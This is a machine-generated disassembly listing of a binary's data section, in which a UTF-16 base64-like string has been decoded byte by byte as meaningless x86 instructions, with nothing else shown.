  40a6eb:	00 75 00             	add    %dh,0x0(%ebp)
  40a6ee:	4a                   	dec    %edx
  40a6ef:	00 6a 00             	add    %ch,0x0(%edx)
  40a6f2:	41                   	inc    %ecx
  40a6f3:	00 7a 00             	add    %bh,0x0(%edx)
  40a6f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6f7:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40a6fb:	00 50 00             	add    %dl,0x0(%eax)
  40a6fe:	55                   	push   %ebp
  40a6ff:	00 53 00             	add    %dl,0x0(%ebx)
  40a702:	4c                   	dec    %esp
  40a703:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40a707:	00 49 00             	add    %cl,0x0(%ecx)
  40a70a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a70b:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a70f:	00 2b                	add    %ch,(%ebx)
  40a711:	00 52 00             	add    %dl,0x0(%edx)
  40a714:	50                   	push   %eax
  40a715:	00 38                	add    %bh,(%eax)
  40a717:	00 59 00             	add    %bl,0x0(%ecx)
  40a71a:	30 00                	xor    %al,(%eax)
  40a71c:	31 00                	xor    %eax,(%eax)
  40a71e:	32 00                	xor    (%eax),%al
  40a720:	34 00                	xor    $0x0,%al
  40a722:	31 00                	xor    %eax,(%eax)
  40a724:	47                   	inc    %edi
  40a725:	00 66 00             	add    %ah,0x0(%esi)
  40a728:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a72c:	70 00                	jo     0x40a72e
  40a72e:	30 00                	xor    %al,(%eax)
  40a730:	32 00                	xor    (%eax),%al
  40a732:	72 00                	jb     0x40a734
  40a734:	74 00                	je     0x40a736
  40a736:	42                   	inc    %edx
  40a737:	00 33                	add    %dh,(%ebx)
  40a739:	00 68 00             	add    %ch,0x0(%eax)
  40a73c:	4f                   	dec    %edi
  40a73d:	00 6e 00             	add    %ch,0x0(%esi)
  40a740:	57                   	push   %edi
  40a741:	00 45 00             	add    %al,0x0(%ebp)
  40a744:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40a748:	4d                   	dec    %ebp
  40a749:	00 73 00             	add    %dh,0x0(%ebx)
  40a74c:	68 00 54 00 31       	push   $0x31005400
  40a751:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40a755:	00 31                	add    %dh,(%ecx)
  40a757:	00 52 00             	add    %dl,0x0(%edx)
  40a75a:	59                   	pop    %ecx
  40a75b:	00 58 00             	add    %bl,0x0(%eax)
  40a75e:	4d                   	dec    %ebp
  40a75f:	00 43 00             	add    %al,0x0(%ebx)
  40a762:	51                   	push   %ecx
  40a763:	00 66 00             	add    %ah,0x0(%esi)
  40a766:	6c                   	insb   (%dx),%es:(%edi)
  40a767:	00 63 00             	add    %ah,0x0(%ebx)
  40a76a:	4e                   	dec    %esi
  40a76b:	00 71 00             	add    %dh,0x0(%ecx)
  40a76e:	46                   	inc    %esi
  40a76f:	00 77 00             	add    %dh,0x0(%edi)
  40a772:	78 00                	js     0x40a774
  40a774:	49                   	dec    %ecx
  40a775:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40a779:	00 63 00             	add    %ah,0x0(%ebx)
  40a77c:	2b 00                	sub    (%eax),%eax
  40a77e:	78 00                	js     0x40a780
  40a780:	34 00                	xor    $0x0,%al
  40a782:	47                   	inc    %edi
  40a783:	00 4a 00             	add    %cl,0x0(%edx)
  40a786:	41                   	inc    %ecx
  40a787:	00 7a 00             	add    %bh,0x0(%edx)
  40a78a:	32 00                	xor    (%eax),%al
  40a78c:	5a                   	pop    %edx
  40a78d:	00 33                	add    %dh,(%ebx)
  40a78f:	00 2f                	add    %ch,(%edi)
  40a791:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40a795:	00 6b 00             	add    %ch,0x0(%ebx)
  40a798:	41                   	inc    %ecx
  40a799:	00 4a 00             	add    %cl,0x0(%edx)
  40a79c:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a79f:	00 67 00             	add    %ah,0x0(%edi)
  40a7a2:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40a7a6:	68 00 62 00 53       	push   $0x53006200
  40a7ab:	00 69 00             	add    %ch,0x0(%ecx)
  40a7ae:	74 00                	je     0x40a7b0
  40a7b0:	7a 00                	jp     0x40a7b2
  40a7b2:	72 00                	jb     0x40a7b4
  40a7b4:	4f                   	dec    %edi
  40a7b5:	00 57 00             	add    %dl,0x0(%edi)
  40a7b8:	75 00                	jne    0x40a7ba
  40a7ba:	4e                   	dec    %esi
  40a7bb:	00 30                	add    %dh,(%eax)
  40a7bd:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7c0:	31 00                	xor    %eax,(%eax)
  40a7c2:	37                   	aaa
  40a7c3:	00 58 00             	add    %bl,0x0(%eax)
  40a7c6:	71 00                	jno    0x40a7c8
  40a7c8:	56                   	push   %esi
  40a7c9:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a7cd:	00 57 00             	add    %dl,0x0(%edi)
  40a7d0:	71 00                	jno    0x40a7d2
  40a7d2:	52                   	push   %edx
  40a7d3:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40a7d7:	00 35 00 42 00 41    	add    %dh,0x41004200
  40a7dd:	00 59 00             	add    %bl,0x0(%ecx)
  40a7e0:	58                   	pop    %eax
  40a7e1:	00 71 00             	add    %dh,0x0(%ecx)
  40a7e4:	6a 00                	push   $0x0
  40a7e6:	48                   	dec    %eax
  40a7e7:	00 4f 00             	add    %cl,0x0(%edi)
  40a7ea:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40a7ee:	34 00                	xor    $0x0,%al
  40a7f0:	4c                   	dec    %esp
  40a7f1:	00 33                	add    %dh,(%ebx)
  40a7f3:	00 79 00             	add    %bh,0x0(%ecx)
  40a7f6:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a7f9:	00 55 00             	add    %dl,0x0(%ebp)
  40a7fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7fd:	00 4f 00             	add    %cl,0x0(%edi)
  40a800:	58                   	pop    %eax
  40a801:	00 59 00             	add    %bl,0x0(%ecx)
  40a804:	4b                   	dec    %ebx
  40a805:	00 39                	add    %bh,(%ecx)
  40a807:	00 6a 00             	add    %ch,0x0(%edx)
  40a80a:	66 00 42 00          	data16 add %al,0x0(%edx)
  40a80e:	44                   	inc    %esp
  40a80f:	00 6f 00             	add    %ch,0x0(%edi)
  40a812:	38 00                	cmp    %al,(%eax)
  40a814:	62 00                	bound  %eax,(%eax)
  40a816:	68 00 44 00 6d       	push   $0x6d004400
  40a81b:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a81f:	00 31                	add    %dh,(%ecx)
  40a821:	00 73 00             	add    %dh,0x0(%ebx)
  40a824:	39 00                	cmp    %eax,(%eax)
  40a826:	4f                   	dec    %edi
  40a827:	00 46 00             	add    %al,0x0(%esi)
  40a82a:	55                   	push   %ebp
  40a82b:	00 63 00             	add    %ah,0x0(%ebx)
  40a82e:	41                   	inc    %ecx
  40a82f:	00 62 00             	add    %ah,0x0(%edx)
  40a832:	56                   	push   %esi
  40a833:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40a837:	00 4a 00             	add    %cl,0x0(%edx)
  40a83a:	31 00                	xor    %eax,(%eax)
  40a83c:	7a 00                	jp     0x40a83e
  40a83e:	74 00                	je     0x40a840
  40a840:	41                   	inc    %ecx
  40a841:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40a845:	00 75 00             	add    %dh,0x0(%ebp)
  40a848:	78 00                	js     0x40a84a
  40a84a:	37                   	aaa
  40a84b:	00 4e 00             	add    %cl,0x0(%esi)
  40a84e:	53                   	push   %ebx
  40a84f:	00 77 00             	add    %dh,0x0(%edi)
  40a852:	66 00 2f             	data16 add %ch,(%edi)
  40a855:	00 63 00             	add    %ah,0x0(%ebx)
  40a858:	5a                   	pop    %edx
  40a859:	00 49 00             	add    %cl,0x0(%ecx)
  40a85c:	58                   	pop    %eax
  40a85d:	00 45 00             	add    %al,0x0(%ebp)
  40a860:	2f                   	das
  40a861:	00 77 00             	add    %dh,0x0(%edi)
  40a864:	62 00                	bound  %eax,(%eax)
  40a866:	77 00                	ja     0x40a868
  40a868:	69 00 48 00 48 00    	imul   $0x480048,(%eax),%eax
  40a86e:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40a872:	73 00                	jae    0x40a874
  40a874:	37                   	aaa
  40a875:	00 45 00             	add    %al,0x0(%ebp)
  40a878:	45                   	inc    %ebp
  40a879:	00 45 00             	add    %al,0x0(%ebp)
  40a87c:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a880:	30 00                	xor    %al,(%eax)
  40a882:	4f                   	dec    %edi
  40a883:	00 63 00             	add    %ah,0x0(%ebx)
  40a886:	51                   	push   %ecx
  40a887:	00 39                	add    %bh,(%ecx)
  40a889:	00 4a 00             	add    %cl,0x0(%edx)
  40a88c:	63 00                	arpl   %eax,(%eax)
  40a88e:	2f                   	das
  40a88f:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a893:	00 67 00             	add    %ah,0x0(%edi)
  40a896:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40a89a:	63 00                	arpl   %eax,(%eax)
  40a89c:	5a                   	pop    %edx
  40a89d:	00 53 00             	add    %dl,0x0(%ebx)
  40a8a0:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40a8a4:	50                   	push   %eax
  40a8a5:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40a8a9:	00 32                	add    %dh,(%edx)
  40a8ab:	00 55 00             	add    %dl,0x0(%ebp)
  40a8ae:	74 00                	je     0x40a8b0
  40a8b0:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40a8b4:	63 00                	arpl   %eax,(%eax)
  40a8b6:	56                   	push   %esi
  40a8b7:	00 61 00             	add    %ah,0x0(%ecx)
  40a8ba:	48                   	dec    %eax
  40a8bb:	00 75 00             	add    %dh,0x0(%ebp)
  40a8be:	73 00                	jae    0x40a8c0
  40a8c0:	63 00                	arpl   %eax,(%eax)
  40a8c2:	6a 00                	push   $0x0
  40a8c4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8c5:	00 77 00             	add    %dh,0x0(%edi)
  40a8c8:	52                   	push   %edx
  40a8c9:	00 75 00             	add    %dh,0x0(%ebp)
  40a8cc:	35 00 4f 00 45       	xor    $0x45004f00,%eax
  40a8d1:	00 66 00             	add    %ah,0x0(%esi)
  40a8d4:	52                   	push   %edx
  40a8d5:	00 2f                	add    %ch,(%edi)
  40a8d7:	00 43 00             	add    %al,0x0(%ebx)
  40a8da:	45                   	inc    %ebp
  40a8db:	00 71 00             	add    %dh,0x0(%ecx)
  40a8de:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40a8e2:	4d                   	dec    %ebp
  40a8e3:	00 2b                	add    %ch,(%ebx)
  40a8e5:	00 56 00             	add    %dl,0x0(%esi)
  40a8e8:	44                   	inc    %esp
  40a8e9:	00 49 00             	add    %cl,0x0(%ecx)
  40a8ec:	76 00                	jbe    0x40a8ee
  40a8ee:	49                   	dec    %ecx
  40a8ef:	00 6e 00             	add    %ch,0x0(%esi)
  40a8f2:	38 00                	cmp    %al,(%eax)
  40a8f4:	6a 00                	push   $0x0
  40a8f6:	53                   	push   %ebx
  40a8f7:	00 71 00             	add    %dh,0x0(%ecx)
  40a8fa:	6c                   	insb   (%dx),%es:(%edi)
  40a8fb:	00 51 00             	add    %dl,0x0(%ecx)
  40a8fe:	63 00                	arpl   %eax,(%eax)
  40a900:	38 00                	cmp    %al,(%eax)
  40a902:	76 00                	jbe    0x40a904
  40a904:	2b 00                	sub    (%eax),%eax
  40a906:	78 00                	js     0x40a908
  40a908:	37                   	aaa
  40a909:	00 6f 00             	add    %ch,0x0(%edi)
  40a90c:	4b                   	dec    %ebx
  40a90d:	00 43 00             	add    %al,0x0(%ebx)
  40a910:	4d                   	dec    %ebp
  40a911:	00 73 00             	add    %dh,0x0(%ebx)
  40a914:	35 00 64 00 76       	xor    $0x76006400,%eax
  40a919:	00 63 00             	add    %ah,0x0(%ebx)
  40a91c:	70 00                	jo     0x40a91e
  40a91e:	37                   	aaa
  40a91f:	00 45 00             	add    %al,0x0(%ebp)
  40a922:	78 00                	js     0x40a924
  40a924:	63 00                	arpl   %eax,(%eax)
  40a926:	6d                   	insl   (%dx),%es:(%edi)
  40a927:	00 6f 00             	add    %ch,0x0(%edi)
  40a92a:	51                   	push   %ecx
  40a92b:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a92f:	00 79 00             	add    %bh,0x0(%ecx)
  40a932:	6f                   	outsl  %ds:(%esi),(%dx)
  40a933:	00 75 00             	add    %dh,0x0(%ebp)
  40a936:	76 00                	jbe    0x40a938
  40a938:	59                   	pop    %ecx
  40a939:	00 6f 00             	add    %ch,0x0(%edi)
  40a93c:	54                   	push   %esp
  40a93d:	00 55 00             	add    %dl,0x0(%ebp)
  40a940:	62 00                	bound  %eax,(%eax)
  40a942:	2f                   	das
  40a943:	00 41 00             	add    %al,0x0(%ecx)
  40a946:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a94a:	4b                   	dec    %ebx
  40a94b:	00 51 00             	add    %dl,0x0(%ecx)
  40a94e:	79 00                	jns    0x40a950
  40a950:	62 00                	bound  %eax,(%eax)
  40a952:	4d                   	dec    %ebp
  40a953:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40a957:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  40a95b:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40a95f:	00 47 00             	add    %al,0x0(%edi)
  40a962:	6c                   	insb   (%dx),%es:(%edi)
  40a963:	00 38                	add    %bh,(%eax)
  40a965:	00 72 00             	add    %dh,0x0(%edx)
  40a968:	48                   	dec    %eax
  40a969:	00 63 00             	add    %ah,0x0(%ebx)
  40a96c:	45                   	inc    %ebp
  40a96d:	00 5a 00             	add    %bl,0x0(%edx)
  40a970:	32 00                	xor    (%eax),%al
  40a972:	5a                   	pop    %edx
  40a973:	00 70 00             	add    %dh,0x0(%eax)
  40a976:	66 00 35 00 47 00 52 	data16 add %dh,0x52004700
  40a97d:	00 39                	add    %bh,(%ecx)
  40a97f:	00 76 00             	add    %dh,0x0(%esi)
  40a982:	70 00                	jo     0x40a984
  40a984:	4d                   	dec    %ebp
  40a985:	00 46 00             	add    %al,0x0(%esi)
  40a988:	7a 00                	jp     0x40a98a
  40a98a:	72 00                	jb     0x40a98c
  40a98c:	74 00                	je     0x40a98e
  40a98e:	47                   	inc    %edi
  40a98f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a992:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a995:	00 53 00             	add    %dl,0x0(%ebx)
  40a998:	6f                   	outsl  %ds:(%esi),(%dx)
  40a999:	00 77 00             	add    %dh,0x0(%edi)
  40a99c:	56                   	push   %esi
  40a99d:	00 75 00             	add    %dh,0x0(%ebp)
  40a9a0:	53                   	push   %ebx
  40a9a1:	00 46 00             	add    %al,0x0(%esi)
  40a9a4:	73 00                	jae    0x40a9a6
  40a9a6:	48                   	dec    %eax
  40a9a7:	00 4e 00             	add    %cl,0x0(%esi)
  40a9aa:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40a9ae:	78 00                	js     0x40a9b0
  40a9b0:	53                   	push   %ebx
  40a9b1:	00 45 00             	add    %al,0x0(%ebp)
  40a9b4:	7a 00                	jp     0x40a9b6
  40a9b6:	57                   	push   %edi
  40a9b7:	00 65 00             	add    %ah,0x0(%ebp)
  40a9ba:	44                   	inc    %esp
  40a9bb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9be:	42                   	inc    %edx
  40a9bf:	00 61 00             	add    %ah,0x0(%ecx)
  40a9c2:	39 00                	cmp    %eax,(%eax)
  40a9c4:	62 00                	bound  %eax,(%eax)
  40a9c6:	75 00                	jne    0x40a9c8
  40a9c8:	72 00                	jb     0x40a9ca
  40a9ca:	2f                   	das
  40a9cb:	00 58 00             	add    %bl,0x0(%eax)
  40a9ce:	47                   	inc    %edi
  40a9cf:	00 31                	add    %dh,(%ecx)
  40a9d1:	00 30                	add    %dh,(%eax)
  40a9d3:	00 42 00             	add    %al,0x0(%edx)
  40a9d6:	30 00                	xor    %al,(%eax)
  40a9d8:	50                   	push   %eax
  40a9d9:	00 2f                	add    %ch,(%edi)
  40a9db:	00 47 00             	add    %al,0x0(%edi)
  40a9de:	73 00                	jae    0x40a9e0
  40a9e0:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40a9e4:	48                   	dec    %eax
  40a9e5:	00 4e 00             	add    %cl,0x0(%esi)
  40a9e8:	2b 00                	sub    (%eax),%eax
  40a9ea:	77 00                	ja     0x40a9ec
  40a9ec:	75 00                	jne    0x40a9ee
  40a9ee:	31 00                	xor    %eax,(%eax)
  40a9f0:	63 00                	arpl   %eax,(%eax)
  40a9f2:	47                   	inc    %edi
  40a9f3:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40a9f7:	00 45 00             	add    %al,0x0(%ebp)
  40a9fa:	32 00                	xor    (%eax),%al
  40a9fc:	6a 00                	push   $0x0
  40a9fe:	35 00 42 00 38       	xor    $0x38004200,%eax
  40aa03:	00 66 00             	add    %ah,0x0(%esi)
  40aa06:	41                   	inc    %ecx
  40aa07:	00 46 00             	add    %al,0x0(%esi)
  40aa0a:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  40aa0e:	2f                   	das
  40aa0f:	00 69 00             	add    %ch,0x0(%ecx)
  40aa12:	53                   	push   %ebx
  40aa13:	00 46 00             	add    %al,0x0(%esi)
  40aa16:	61                   	popa
  40aa17:	00 47 00             	add    %al,0x0(%edi)
  40aa1a:	49                   	dec    %ecx
  40aa1b:	00 71 00             	add    %dh,0x0(%ecx)
  40aa1e:	4c                   	dec    %esp
  40aa1f:	00 33                	add    %dh,(%ebx)
  40aa21:	00 58 00             	add    %bl,0x0(%eax)
  40aa24:	6a 00                	push   $0x0
  40aa26:	72 00                	jb     0x40aa28
  40aa28:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40aa2c:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40aa30:	61                   	popa
  40aa31:	00 58 00             	add    %bl,0x0(%eax)
  40aa34:	69 00 31 00 52 00    	imul   $0x520031,(%eax),%eax
  40aa3a:	56                   	push   %esi
  40aa3b:	00 77 00             	add    %dh,0x0(%edi)
  40aa3e:	6b 00 61             	imul   $0x61,(%eax),%eax
  40aa41:	00 6e 00             	add    %ch,0x0(%esi)
  40aa44:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40aa48:	56                   	push   %esi
  40aa49:	00 71 00             	add    %dh,0x0(%ecx)
  40aa4c:	5a                   	pop    %edx
  40aa4d:	00 5a 00             	add    %bl,0x0(%edx)
  40aa50:	46                   	inc    %esi
  40aa51:	00 38                	add    %bh,(%eax)
  40aa53:	00 66 00             	add    %ah,0x0(%esi)
  40aa56:	42                   	inc    %edx
  40aa57:	00 32                	add    %dh,(%edx)
  40aa59:	00 37                	add    %dh,(%edi)
  40aa5b:	00 35 00 61 00 38    	add    %dh,0x38006100
  40aa61:	00 39                	add    %bh,(%ecx)
  40aa63:	00 46 00             	add    %al,0x0(%esi)
  40aa66:	50                   	push   %eax
  40aa67:	00 77 00             	add    %dh,0x0(%edi)
  40aa6a:	78 00                	js     0x40aa6c
  40aa6c:	30 00                	xor    %al,(%eax)
  40aa6e:	31 00                	xor    %eax,(%eax)
  40aa70:	53                   	push   %ebx
  40aa71:	00 78 00             	add    %bh,0x0(%eax)
  40aa74:	77 00                	ja     0x40aa76
  40aa76:	59                   	pop    %ecx
  40aa77:	00 42 00             	add    %al,0x0(%edx)
  40aa7a:	62 00                	bound  %eax,(%eax)
  40aa7c:	43                   	inc    %ebx
  40aa7d:	00 75 00             	add    %dh,0x0(%ebp)
  40aa80:	39 00                	cmp    %eax,(%eax)
  40aa82:	68 00 7a 00 33       	push   $0x33007a00
  40aa87:	00 49 00             	add    %cl,0x0(%ecx)
  40aa8a:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40aa8d:	00 62 00             	add    %ah,0x0(%edx)
  40aa90:	69 00 5a 00 34 00    	imul   $0x34005a,(%eax),%eax
  40aa96:	41                   	inc    %ecx
  40aa97:	00 41 00             	add    %al,0x0(%ecx)
  40aa9a:	68 00 35 00 38       	push   $0x38003500
  40aa9f:	00 4b 00             	add    %cl,0x0(%ebx)
  40aaa2:	55                   	push   %ebp
  40aaa3:	00 47 00             	add    %al,0x0(%edi)
  40aaa6:	79 00                	jns    0x40aaa8
  40aaa8:	42                   	inc    %edx
  40aaa9:	00 70 00             	add    %dh,0x0(%eax)
  40aaac:	2f                   	das
  40aaad:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40aab1:	00 59 00             	add    %bl,0x0(%ecx)
  40aab4:	56                   	push   %esi
  40aab5:	00 2f                	add    %ch,(%edi)
  40aab7:	00 53 00             	add    %dl,0x0(%ebx)
  40aaba:	34 00                	xor    $0x0,%al
  40aabc:	6f                   	outsl  %ds:(%esi),(%dx)
  40aabd:	00 30                	add    %dh,(%eax)
  40aabf:	00 36                	add    %dh,(%esi)
  40aac1:	00 2b                	add    %ch,(%ebx)
  40aac3:	00 47 00             	add    %al,0x0(%edi)
  40aac6:	57                   	push   %edi
  40aac7:	00 66 00             	add    %ah,0x0(%esi)
  40aaca:	44                   	inc    %esp
  40aacb:	00 31                	add    %dh,(%ecx)
  40aacd:	00 6e 00             	add    %ch,0x0(%esi)
  40aad0:	33 00                	xor    (%eax),%eax
  40aad2:	35 00 6e 00 6d       	xor    $0x6d006e00,%eax
  40aad7:	00 59 00             	add    %bl,0x0(%ecx)
  40aada:	4c                   	dec    %esp
  40aadb:	00 50 00             	add    %dl,0x0(%eax)
  40aade:	31 00                	xor    %eax,(%eax)
  40aae0:	44                   	inc    %esp
  40aae1:	00 51 00             	add    %dl,0x0(%ecx)
  40aae4:	54                   	push   %esp
  40aae5:	00 39                	add    %bh,(%ecx)
  40aae7:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40aaeb:	00 42 00             	add    %al,0x0(%edx)
  40aaee:	75 00                	jne    0x40aaf0
  40aaf0:	33 00                	xor    (%eax),%eax
  40aaf2:	61                   	popa
  40aaf3:	00 7a 00             	add    %bh,0x0(%edx)
  40aaf6:	41                   	inc    %ecx
  40aaf7:	00 6b 00             	add    %ch,0x0(%ebx)
  40aafa:	74 00                	je     0x40aafc
  40aafc:	54                   	push   %esp
  40aafd:	00 4a 00             	add    %cl,0x0(%edx)
  40ab00:	78 00                	js     0x40ab02
  40ab02:	42                   	inc    %edx
  40ab03:	00 73 00             	add    %dh,0x0(%ebx)
  40ab06:	68 00 47 00 4a       	push   $0x4a004700
  40ab0b:	00 69 00             	add    %ch,0x0(%ecx)
  40ab0e:	4b                   	dec    %ebx
  40ab0f:	00 39                	add    %bh,(%ecx)
  40ab11:	00 43 00             	add    %al,0x0(%ebx)
  40ab14:	4c                   	dec    %esp
  40ab15:	00 4e 00             	add    %cl,0x0(%esi)
  40ab18:	47                   	inc    %edi
  40ab19:	00 45 00             	add    %al,0x0(%ebp)
  40ab1c:	52                   	push   %edx
  40ab1d:	00 52 00             	add    %dl,0x0(%edx)
  40ab20:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40ab24:	79 00                	jns    0x40ab26
  40ab26:	78 00                	js     0x40ab28
  40ab28:	5a                   	pop    %edx
  40ab29:	00 50 00             	add    %dl,0x0(%eax)
  40ab2c:	37                   	aaa
  40ab2d:	00 2f                	add    %ch,(%edi)
  40ab2f:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40ab33:	00 75 00             	add    %dh,0x0(%ebp)
  40ab36:	76 00                	jbe    0x40ab38
  40ab38:	59                   	pop    %ecx
  40ab39:	00 68 00             	add    %ch,0x0(%eax)
  40ab3c:	6c                   	insb   (%dx),%es:(%edi)
  40ab3d:	00 49 00             	add    %cl,0x0(%ecx)
  40ab40:	50                   	push   %eax
  40ab41:	00 48 00             	add    %cl,0x0(%eax)
  40ab44:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab45:	00 6a 00             	add    %ch,0x0(%edx)
  40ab48:	72 00                	jb     0x40ab4a
  40ab4a:	30 00                	xor    %al,(%eax)
  40ab4c:	62 00                	bound  %eax,(%eax)
  40ab4e:	68 00 71 00 53       	push   $0x53007100
  40ab53:	00 72 00             	add    %dh,0x0(%edx)
  40ab56:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40ab5a:	4c                   	dec    %esp
  40ab5b:	00 49 00             	add    %cl,0x0(%ecx)
  40ab5e:	51                   	push   %ecx
  40ab5f:	00 50 00             	add    %dl,0x0(%eax)
  40ab62:	44                   	inc    %esp
  40ab63:	00 6e 00             	add    %ch,0x0(%esi)
  40ab66:	2f                   	das
  40ab67:	00 41 00             	add    %al,0x0(%ecx)
  40ab6a:	4d                   	dec    %ebp
  40ab6b:	00 5a 00             	add    %bl,0x0(%edx)
  40ab6e:	55                   	push   %ebp
  40ab6f:	00 57 00             	add    %dl,0x0(%edi)
  40ab72:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab73:	00 69 00             	add    %ch,0x0(%ecx)
  40ab76:	41                   	inc    %ecx
  40ab77:	00 70 00             	add    %dh,0x0(%eax)
  40ab7a:	38 00                	cmp    %al,(%eax)
  40ab7c:	30 00                	xor    %al,(%eax)
  40ab7e:	4d                   	dec    %ebp
  40ab7f:	00 57 00             	add    %dl,0x0(%edi)
  40ab82:	73 00                	jae    0x40ab84
  40ab84:	54                   	push   %esp
  40ab85:	00 42 00             	add    %al,0x0(%edx)
  40ab88:	41                   	inc    %ecx
  40ab89:	00 53 00             	add    %dl,0x0(%ebx)
  40ab8c:	47                   	inc    %edi
  40ab8d:	00 76 00             	add    %dh,0x0(%esi)
  40ab90:	73 00                	jae    0x40ab92
  40ab92:	54                   	push   %esp
  40ab93:	00 75 00             	add    %dh,0x0(%ebp)
  40ab96:	32 00                	xor    (%eax),%al
  40ab98:	67 00 30             	add    %dh,(%bx,%si)
  40ab9b:	00 7a 00             	add    %bh,0x0(%edx)
  40ab9e:	57                   	push   %edi
  40ab9f:	00 73 00             	add    %dh,0x0(%ebx)
  40aba2:	30 00                	xor    %al,(%eax)
  40aba4:	70 00                	jo     0x40aba6
  40aba6:	68 00 78 00 61       	push   $0x61007800
  40abab:	00 55 00             	add    %dl,0x0(%ebp)
  40abae:	6d                   	insl   (%dx),%es:(%edi)
  40abaf:	00 4b 00             	add    %cl,0x0(%ebx)
  40abb2:	35 00 69 00 38       	xor    $0x38006900,%eax
  40abb7:	00 46 00             	add    %al,0x0(%esi)
  40abba:	58                   	pop    %eax
  40abbb:	00 49 00             	add    %cl,0x0(%ecx)
  40abbe:	30 00                	xor    %al,(%eax)
  40abc0:	46                   	inc    %esi
  40abc1:	00 51 00             	add    %dl,0x0(%ecx)
  40abc4:	49                   	dec    %ecx
  40abc5:	00 68 00             	add    %ch,0x0(%eax)
  40abc8:	59                   	pop    %ecx
  40abc9:	00 78 00             	add    %bh,0x0(%eax)
  40abcc:	6c                   	insb   (%dx),%es:(%edi)
  40abcd:	00 4a 00             	add    %cl,0x0(%edx)
  40abd0:	62 00                	bound  %eax,(%eax)
  40abd2:	39 00                	cmp    %eax,(%eax)
  40abd4:	6d                   	insl   (%dx),%es:(%edi)
  40abd5:	00 69 00             	add    %ch,0x0(%ecx)
  40abd8:	35 00 38 00 67       	xor    $0x67003800,%eax
  40abdd:	00 55 00             	add    %dl,0x0(%ebp)
  40abe0:	33 00                	xor    (%eax),%eax
  40abe2:	59                   	pop    %ecx
  40abe3:	00 66 00             	add    %ah,0x0(%esi)
  40abe6:	79 00                	jns    0x40abe8
  40abe8:	76 00                	jbe    0x40abea
  40abea:	51                   	push   %ecx
  40abeb:	00 59 00             	add    %bl,0x0(%ecx)
  40abee:	6b 00 57             	imul   $0x57,(%eax),%eax
  40abf1:	00 4d 00             	add    %cl,0x0(%ebp)
  40abf4:	62 00                	bound  %eax,(%eax)
  40abf6:	45                   	inc    %ebp
  40abf7:	00 71 00             	add    %dh,0x0(%ecx)
  40abfa:	33 00                	xor    (%eax),%eax
  40abfc:	5a                   	pop    %edx
  40abfd:	00 62 00             	add    %ah,0x0(%edx)
  40ac00:	63 00                	arpl   %eax,(%eax)
  40ac02:	7a 00                	jp     0x40ac04
  40ac04:	38 00                	cmp    %al,(%eax)
  40ac06:	38 00                	cmp    %al,(%eax)
  40ac08:	31 00                	xor    %eax,(%eax)
  40ac0a:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40ac0e:	55                   	push   %ebp
  40ac0f:	00 70 00             	add    %dh,0x0(%eax)
  40ac12:	6d                   	insl   (%dx),%es:(%edi)
  40ac13:	00 38                	add    %bh,(%eax)
  40ac15:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac18:	46                   	inc    %esi
  40ac19:	00 38                	add    %bh,(%eax)
  40ac1b:	00 33                	add    %dh,(%ebx)
  40ac1d:	00 49 00             	add    %cl,0x0(%ecx)
  40ac20:	4b                   	dec    %ebx
  40ac21:	00 2f                	add    %ch,(%edi)
  40ac23:	00 50 00             	add    %dl,0x0(%eax)
  40ac26:	32 00                	xor    (%eax),%al
  40ac28:	79 00                	jns    0x40ac2a
  40ac2a:	6c                   	insb   (%dx),%es:(%edi)
  40ac2b:	00 59 00             	add    %bl,0x0(%ecx)
